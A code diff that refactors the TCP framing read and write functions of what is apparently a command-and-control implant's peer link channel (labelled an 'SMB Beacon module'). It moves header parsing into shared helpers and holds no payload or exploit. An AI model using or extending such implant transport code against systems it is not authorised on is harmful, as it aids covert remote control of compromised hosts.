@@ -94,43 +94,22 @@ static int recv_frame(SOCKET my_socket, char * buffer, int size) {
 /* 
  * Implement our SMB Beacon module.
  */
+static int tcp_raw_read(void * ctx, char * buffer, int n) {
+	return recv_frame((SOCKET)(size_t)ctx, buffer, n);
+}
+
+static int tcp_raw_write(void * ctx, char * buffer, int n) {
+	return send_frame((SOCKET)(size_t)ctx, buffer, n);
+}
+
 int link_channel_tcp_read(void * thisp, char * buffer, int max) {
 	LCHANNEL * inst = (LCHANNEL *)thisp;
-	char     * frame;
-	int        flen, rlen, get;
-
-	/* read our length into a pro-forma frame */
-	frame = link_frame_header(SETTING_TCP_FRAME_HEADER, 0, &flen);
-	if (frame == NULL)
-		return -1;
-	rlen = recv_frame(inst->socket, frame, flen);
-	if (rlen == -1 || rlen != flen)
-		return -1;
-
-	/* extract our length value... */
-	memcpy(&get, frame + flen + -4, 4);
-
-	/* sanity check our get value */
-	if (get > max || get < 0)
-		return -1;
-
-	return recv_frame(inst->socket, buffer, get);
+	return link_frame_read(SETTING_TCP_FRAME_HEADER, tcp_raw_read, (void *)(size_t)inst->socket, buffer, max);
 }
 
 int link_channel_tcp_write(void * thisp, char * buffer, int length) {
 	LCHANNEL * inst = (LCHANNEL *)thisp;
-	char     * frame;
-	int        flen;
-
-	/* build and write our frame header */
-	frame = link_frame_header(SETTING_TCP_FRAME_HEADER, length, &flen);
-	if (frame == NULL)
-		return FALSE;
-	if (!send_frame(inst->socket, frame, flen))
-		return FALSE;
-
-	/* write the entire package */
-	return send_frame(inst->socket, buffer, length);
+	return link_frame_write(SETTING_TCP_FRAME_HEADER, tcp_raw_write, (void *)(size_t)inst->socket, buffer, length);
 }
 
 void link_channel_tcp_close(void * thisp) {
